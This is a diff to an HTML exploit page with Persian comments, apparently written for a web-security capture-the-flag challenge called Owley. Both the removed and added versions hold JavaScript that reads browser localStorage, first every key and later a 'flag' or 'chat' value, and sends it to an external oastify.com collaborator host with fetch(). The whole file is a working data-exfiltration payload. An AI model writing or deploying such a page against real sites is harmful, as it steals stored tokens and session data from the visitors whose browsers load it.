@@ -1,22 +1,26 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>evil</title>
+    <title>Owley Exploit</title>
     <script>
-      setTimeout(() => {
-        let result = "";
-        for (let i = 0; i < localStorage.length; i++) {
-          const key = localStorage.key(i);
-          const value = localStorage.getItem(key);
-          result += key + "=" + value + "&";
-        }
+      // گام 1: باز کردن صفحه چت (که توسط CRAWLER لود میشه)
+      let win = window.open("https://gameserver.websec.saarland/owley", "_blank");
 
-        // send all localStorage keys/values to oastify
-        fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?" + encodeURIComponent(result));
-      }, 3000);
+      // گام 2: منتظر بمون تا flag ست بشه تو localStorage (مثلاً توسط chat page)
+      setTimeout(() => {
+        try {
+          // گام 3: خوندن flag
+          const flag = localStorage.getItem("flag") || localStorage.getItem("chat") || "no-flag";
+
+          // گام 4: ارسال flag به سرورمون (OASTify)
+          fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?" + encodeURIComponent(flag));
+        } catch (e) {
+          fetch("https://0ghj7ax4p9pg0zr3v94kctd6sxyomea3.oastify.com/log?error=" + encodeURIComponent(e.toString()));
+        }
+      }, 5000); // 5 ثانیه تاخیر برای اطمینان از لود شدن
     </script>
   </head>
   <body>
-    <h1>Loading Owley Chat...</h1>
+    <h1>Loading chat session for Owley...</h1>
   </body>
 </html>
